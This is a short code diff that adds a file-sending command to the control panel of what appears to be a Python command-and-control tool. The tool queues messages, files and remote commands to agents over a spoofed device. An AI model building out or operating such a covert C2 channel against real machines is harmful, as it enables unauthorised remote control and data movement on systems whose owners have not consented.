@@ -40,6 +40,7 @@ def main():
             print("""
 Control Panel:
     m:[MESSAGE] - Send a message
+    f:[FILE_PATH] - Send file
     c:[COMMAND] - Execute a command (c2 only)
     l - List agents
     q - quit
@@ -49,7 +50,7 @@ Control Panel:
                 list_agents(spoofed_device)
             elif command_input == 'q':
                 os._exit(0)
-            elif command_input.startswith('m') or command_input.startswith('c'):
+            elif command_input[0] in ('c', 'm', 'f'):
                 if not args.is_c2 and command_input.startswith('c'):
                     print("C2 only command.")
                     continue
@@ -70,6 +71,9 @@ Control Panel:
                 if agent_ip:
                     command = command_input[0].encode('utf8')
                     content = command_input[2:].encode('utf8')
+                    if command_input[0] == 'f':
+                        file_name_length = len(content).to_bytes(4, byteorder='big')
+                        content = file_name_length + content
                     queued = spoofed_device.queue_message(agent_ip, command, content)
                     if queued:
                         print(f"Message queued for {agent_ip}")
